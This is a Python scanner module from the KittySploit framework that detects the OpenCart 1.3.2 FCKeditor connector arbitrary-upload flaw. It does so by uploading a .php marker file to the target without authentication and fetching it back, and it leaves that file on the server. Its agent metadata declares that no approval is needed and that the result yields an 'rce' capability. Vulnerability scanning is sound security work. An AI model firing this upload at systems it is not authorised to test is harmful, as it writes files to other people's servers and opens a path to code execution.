#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects OpenCart <= 1."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OpenCart - FCKeditor Connector Arbitrary Upload Detection',
        'description': (
            'Detects OpenCart <= 1.3.2 FCKeditor connector upload by uploading a marker file.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'opencart', 'fckeditor', 'upload', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.securityfocus.com/bid/43325',
        ],
    }

    def run(self):
        marker = 'VT-Upload-Test'
        fname = 'ks-upload-test-delete-me.php'
        boundary = '---------------------------1179981022663023650735134601'
        body = (
            f'--{boundary}\r\n'
            f"Content-Disposition: form-data; name='NewFile'; filename='{fname}'\r\n"
            'Content-Type: text/plain\r\n\r\n'
            f'{marker}\r\n\r\n'
            f'--{boundary}--\r\n'
        )
        for base in ('', '/opencart', '/shop'):
            path = (
                f'{base}/admin/view/javascript/fckeditor/editor/filemanager/connectors/php/'
                'connector.php?Command=FileUpload&Type=File&CurrentFolder=%2F'
            )
            r = self.http_request(
                method='POST', path=path, data=body,
                headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
                allow_redirects=False,
            )
            if not r or 'OnUploadCompleted' not in (r.text or '') or fname not in (r.text or ''):
                continue
            check = (
                f'{base}/admin/view/javascript/fckeditor/editor/filemanager/connectors/php/{fname}'
            )
            r2 = self.http_request(method='GET', path=check, allow_redirects=False)
            if r2 and marker in (r2.text or ''):
                self.set_info(severity='critical', reason='OpenCart FCKeditor arbitrary upload', path=path.split('?')[0])
                return True
        return False

